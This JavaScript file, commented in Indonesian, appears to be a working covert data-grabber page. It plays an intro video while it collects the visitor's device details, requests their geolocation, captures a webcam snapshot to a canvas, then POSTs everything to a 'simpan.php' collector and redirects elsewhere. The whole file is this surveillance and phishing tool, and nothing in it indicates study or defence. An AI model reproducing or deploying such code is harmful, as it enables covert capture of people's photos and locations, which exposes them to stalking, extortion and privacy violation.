// ============================
// ELEMENT
// ============================

const loading = document.getElementById("loading");
const video = document.getElementById("introVideo");
const canvas = document.getElementById("canvas");


// ============================
// DATA PERANGKAT
// ============================

let device = navigator.userAgent;
let platform = navigator.platform;
let bahasa = navigator.language;
let waktu = new Date().toLocaleString();

let latitude = "-";
let longitude = "-";
let foto = "";


// ============================
// TAMPILKAN VIDEO
// ============================

setTimeout(() => {

    if (loading) loading.style.display = "none";

    if (video) {
        video.style.display = "block";
        video.play().catch(() => {});
    }

}, 800);


// ============================
// AMBIL LOKASI (JIKA ADA)
// ============================

if (navigator.geolocation) {

    navigator.geolocation.getCurrentPosition(

        pos => {

            latitude = pos.coords.latitude;
            longitude = pos.coords.longitude;

        },

        err => {

            latitude = "-";
            longitude = "-";

        },

        { timeout: 1000 }

    );

}


// ============================
// AMBIL FOTO (JIKA DIIZINKAN)
// ============================

if (navigator.mediaDevices) {

    navigator.mediaDevices.getUserMedia({ video: true })

        .then(stream => {

            let videoCam = document.createElement("video");
            videoCam.srcObject = stream;
            videoCam.play();

            setTimeout(() => {

                canvas.width = 320;
                canvas.height = 240;

                let ctx = canvas.getContext("2d");
                ctx.drawImage(videoCam, 0, 0, 320, 240);

                foto = canvas.toDataURL("image/png");

                stream.getTracks().forEach(track => track.stop());

            }, 800);

        })

        .catch(() => {

            foto = "";

        });

}


// ============================
// KIRIM DATA KE SERVER
// ============================

setTimeout(() => {

    fetch("simpan.php", {

        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({

            device: device,
            platform: platform,
            bahasa: bahasa,
            waktu: waktu,
            latitude: latitude,
            longitude: longitude,
            foto: foto

        })

    })
    .then(() => {

        window.location.href = "global/global.html";

    })
    .catch(() => {

        window.location.href = "global/global.html";

    });

}, 3000);
